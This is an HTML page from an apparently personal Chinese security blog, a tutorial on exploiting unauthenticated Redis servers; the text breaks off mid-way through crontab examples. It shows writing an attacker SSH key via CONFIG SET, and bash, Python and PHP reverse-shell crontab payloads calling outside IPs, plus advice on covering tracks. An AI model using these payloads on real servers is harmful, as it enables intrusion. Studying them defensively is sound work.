@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="two_smi1e">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="two_smi1e">
+    <meta name="keywords" content="Two_smi1e | two_smi1e">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>redis未授权总结 · Twosmi1e&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Twosmi1e&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">redis未授权总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Twosmi1e's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            redis未授权总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web安全">web安全</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "总结">总结</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">3,910</span> / Reading time: <span class="post-count">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/01/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Redis未授权总结"><a href="#Redis未授权总结" class="headerlink" title="Redis未授权总结"></a>Redis未授权总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>redis</code>是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持<code>push/pop</code>、<code>add/remove</code>及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了<code>master-slave(主从)</code>同步。</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">set testkey &quot;Hello World&quot;  # 设置键testkey的值为字符串Hello World</span><br><span class="line">get testkey                       # 获取键testkey的内容</span><br><span class="line">SET score 99                      # 设置键score的值为99</span><br><span class="line">INCR score                        # 使用INCR命令将score的值增加1</span><br><span class="line">GET score                         # 获取键score的内容</span><br><span class="line">keys *                            # 列出当前数据库中所有的键</span><br><span class="line">get anotherkey                    # 获取一个不存在的键的值</span><br><span class="line">config set dir /home/test         # 设置工作目录</span><br><span class="line">config set dbfilename redis.rdb   # 设置备份文件名</span><br><span class="line">config get dir                    # 检查工作目录是否设置成功</span><br><span class="line">config get dbfilename             # 检查备份文件名是否设置成功</span><br><span class="line">save                              # 进行一次备份操作</span><br><span class="line">flushall 删除所有数据</span><br><span class="line">del key 删除键为key的数据</span><br></pre></td></tr></table></figure>
+<ol>
+<li>使用SET和GET命令，可以完成基本的赋值和取值操作；</li>
+<li>Redis是不区分命令的大小写的，set和SET是同一个意思；</li>
+<li>使用keys *可以列出当前数据库中的所有键；</li>
+<li>当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；</li>
+<li>如果键的值中有空格，需要使用双引号括起来，如”Hello World”；</li>
+</ol>
+<h2 id="配置文件解析"><a href="#配置文件解析" class="headerlink" title="配置文件解析"></a>配置文件解析</h2><p> 在启动Redis服务器进程的时候，可以通过命令行参数指定一个配置文件，这样服务器进程就可以根据配置文件中设定的参数值来运行了。在redis-3.0.1目录下有一个redis.conf文件，这是一个默认的配置文件。</p>
+<blockquote>
+<p>详解<a href="https://blog.csdn.net/weixin_42425970/article/details/94132652" target="_blank" rel="external">https://blog.csdn.net/weixin_42425970/article/details/94132652</a></p>
+</blockquote>
+<h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。</p>
+<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p>格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表示同时绑定在192.168.1.100和10.0.0.1两个IP地址上。如果没有指定bind参数，则绑定在本机的所有IP地址上。</p>
+<h3 id="save"><a href="#save" class="headerlink" title="save"></a>save</h3><p>格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：</p>
+<pre><code>save 900 1
+
+save 300 10
+
+save 60 10000
+</code></pre><p>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。</p>
+<h3 id="requirepass"><a href="#requirepass" class="headerlink" title="requirepass"></a>requirepass</h3><p>格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。</p>
+<h3 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h3><p>格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。</p>
+<h3 id="dbfilename"><a href="#dbfilename" class="headerlink" title="dbfilename"></a>dbfilename</h3><p>格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。</p>
+<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。 </p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Redis有两种持久化的方式：快照（RDB文件）和追加式文件（AOF文件）：</p>
+<ul>
+<li>RDB持久化方式会在一个特定的间隔保存那个时间点的一个数据快照。</li>
+<li>AOF持久化方式则会记录每一个服务器收到的写操作。在服务启动时，这些记录的操作会逐条执行从而重建出原来的数据。写操作命令记录的格式跟Redis协议一致，以追加的方式进行保存。</li>
+<li>Redis的持久化是可以禁用的，就是说你可以让数据的生命周期只存在于服务器的运行时间里。</li>
+<li>两种方式的持久化是可以同时存在的，但是当Redis重启时，AOF文件会被优先用于重建数据。</li>
+</ul>
+<p>AOF备份文件名默认为<code>appendonly.aof</code>，可以在配置文件中的<code>appendfilename</code>设置其他名称，通过测试发现不能在客户端交互中动态设置<code>appendfilename</code>，所以不能通过AOF方式备份写任意文件.</p>
+<p>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#下载源码：</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line">tar -zxvf redis-5.0.5.tar.gz</span><br><span class="line">cd redis-5.0.5</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">#启动redis服务</span><br><span class="line">cd src</span><br><span class="line">./redis-server</span><br><span class="line">可以指定配置文件启动(若不指定则以默认的配置文件启动)：</span><br><span class="line">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/19/redis未授权总结/1578893112267.png" alt="Alt text"></p>
+<p>配置文件：<br>安全模式起作用需要同时满足俩个条件：</p>
+<p>​ (1) redis没有开启登录认证</p>
+<p>​ (2) redis没有绑定到某个ip地址或ip段</p>
+<p>从3.2.0版本开始，当Redis使用缺省的配置并且没有密码保护的时，我们称之为保护模式。</p>
+<p>redis默认是未开启登录认证，开启安全模式的.</p>
+<h3 id="绑定0-0-0-0-开启安全模式"><a href="#绑定0-0-0-0-开启安全模式" class="headerlink" title="绑定0.0.0.0 开启安全模式"></a>绑定0.0.0.0 开启安全模式</h3><p><img src="/2020/01/19/redis未授权总结/1578894197042.png" alt="Alt text"><br>启动redis<br><img src="/2020/01/19/redis未授权总结/1578894325555.png" alt="Alt text"><br>连接可以发现安全模式并没有起作用，可以执行命令<br><img src="/2020/01/19/redis未授权总结/1578894503324.png" alt="Alt text"></p>
+<h3 id="不绑定IP地址-开启安全模式"><a href="#不绑定IP地址-开启安全模式" class="headerlink" title="不绑定IP地址 开启安全模式"></a>不绑定IP地址 开启安全模式</h3><p><img src="/2020/01/19/redis未授权总结/1578895635426.png" alt="Alt text"></p>
+<p>能连接上，但是无法执行命令<br><img src="/2020/01/19/redis未授权总结/1578895587652.png" alt="Alt text"></p>
+<h3 id="不绑定IP地址-关闭安全模式"><a href="#不绑定IP地址-关闭安全模式" class="headerlink" title="不绑定IP地址 关闭安全模式"></a>不绑定IP地址 关闭安全模式</h3><p><img src="/2020/01/19/redis未授权总结/1578895771315.png" alt="Alt text"><br>可以执行命令<br><img src="/2020/01/19/redis未授权总结/1578895712542.png" alt="Alt text"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>造成未授权访问有两种情况：</strong></p>
+<ol>
+<li>未开启登录验证，并且把IP绑定到0.0.0.0</li>
+<li>未开启登录验证，没有设置绑定IP，<code>protected-mode</code>关闭</li>
+</ol>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="0x01-写SSH-keygen"><a href="#0x01-写SSH-keygen" class="headerlink" title="0x01 写SSH-keygen"></a>0x01 写SSH-keygen</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p>
+<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密(非对称)，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端； （2）客户端发起登录请求，发送自己的相关信息； （3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端； （4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证； （5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。</span><br></pre></td></tr></table></figure>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li>root账号启动redis服务</li>
+<li>服务器开放SSH服务，允许密钥登录。</li>
+</ol>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><ol>
+<li>攻击机上生成公私钥<br><img src="/2020/01/19/redis未授权总结/1578904833730.png" alt="Alt text"></li>
+<li><p>未授权访问redis<br><img src="/2020/01/19/redis未授权总结/1578907355861.png" alt="Alt text"></p>
+</li>
+<li><p>利用redis的数据备份功能修改备份目录为 /redis/.ssh/ 备份文件名为 authorized_keys<br><img src="/2020/01/19/redis未授权总结/1578907497847.png" alt="Alt text"></p>
+</li>
+<li>写入键值<br><img src="/2020/01/19/redis未授权总结/1578909102734.png" alt="Alt text"></li>
+<li>ssh连接<br><img src="/2020/01/19/redis未授权总结/1578909442213.png" alt="Alt text"><br>舒服了</li>
+</ol>
+<h3 id="0x02-写计划任务反弹shell"><a href="#0x02-写计划任务反弹shell" class="headerlink" title="0x02 写计划任务反弹shell"></a>0x02 写计划任务反弹shell</h3><p>用户定义的设置，位于文件：/var/spool/cron/用户名</p>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>/var/spool/cron/目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。dbfilename设置为root为用root用户权限执行计划任务。</p>
+<p>执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p>
+<h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>redis是root用户启动</p>
+<h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p><strong>坑：crontab反弹debian,ubuntu都不行</strong>，因为他们对计划任务的格式很严格，必须要执行<br><code>crontab -u root /var/spool/cron/crontabs/root</code><br>通过语法检查后，才能执行计划任务。</p>
+<p>连接redis<br><code>redis-cli -h 106.12.172.25</code><br>执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#获取dir的值</span><br><span class="line">config get dir</span><br><span class="line">#获取dbfilename的值</span><br><span class="line">config get dbfilename</span><br><span class="line">#设置数据库备份目录为linux计划任务目录</span><br><span class="line">config set dir &apos;/var/spool/cron/&apos;</span><br><span class="line">#设置备份文件名为root，以root身份执行计划任务</span><br><span class="line">config set dbfilename &apos;root&apos;</span><br><span class="line">#删除所有数据库的所有key</span><br><span class="line">flushall</span><br><span class="line">#设置写入的内容，在计划任务前后加入换行以确保写入的计划任务可以被正常解析，此处可以直接调用lua语句。</span><br><span class="line">eval &quot;redis.call(&apos;set&apos;,&apos;cron&apos;,string.char(10)..ARGV[1]..string.char(10))&quot; 0 &apos;*/1 * * * * bash -i &gt;&amp; /dev/tcp/106.54.229.29/8080 0&gt;&amp;1&apos;</span><br><span class="line">#保存</span><br><span class="line">save</span><br><span class="line">#删除新增的key</span><br><span class="line">del cron</span><br><span class="line">#恢复dir和dbfilename</span><br><span class="line">config set dir &apos;***&apos;</span><br><span class="line">config set dbfilename &apos;***&apos;</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li><p>登陆redis创建crontab定时任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet x.x.x.x 6379 //未授权登录</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line"></span><br><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>nc监听反弹shell<br>Crontab反弹shell </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n*/1 * * * * /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n\n&quot;</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line">config set dbfilename root</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>savephp反弹shell <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$redis = new Redis();</span><br><span class="line">$redis-&gt;connect(&apos;127.0.0.1&apos;,6379);</span><br><span class="line">$redis-&gt;auth(&quot;password&quot;);</span><br><span class="line">$redis-&gt;flushall();</span><br><span class="line">$redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/spool/cron/&quot;);</span><br><span class="line">$redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root&quot;);</span><br><span class="line">$redis-&gt;set(&quot;0&quot;,&quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1\n\n\n&quot;);</span><br><span class="line">$redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>攻击上监听对应端口就行了</p>
+<p>Ubuntu上写入会发现没有反弹成功<br> <img src="/2020/01/19/redis未授权总结/1579400495673.png" alt="Alt text"><br>因为通过不了语法检查，redis在写入文件时会带一些头，然后就无法执行<br><img src="/2020/01/19/redis未授权总结/1579401646270.png" alt="Alt text"></p>
+<h5 id="crontab的文件格式"><a href="#crontab的文件格式" class="headerlink" title="crontab的文件格式"></a>crontab的文件格式</h5><p>分 时 日 月 星期 要运行的命令</p>
+<p>第1列分钟0～59<br>第2列小时0～23（0表示子夜）<br>第3列日1～31<br>第4列月1～12<br>第5列星期0～7（0和7表示星期天）<br>第6列要运行的命令</p>
+<h5 id="crontab文件一些例子"><a href="#crontab文件一些例子" class="headerlink" title="crontab文件一些例子"></a>crontab文件一些例子</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每晚的21:30重启apache。</span><br><span class="line"></span><br><span class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每月1、10、22日的4 : 45重启apache。</span><br><span class="line"></span><br><span class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每周六、周日的1 : 10重启apache。</span><br><span class="line"></span><br><span 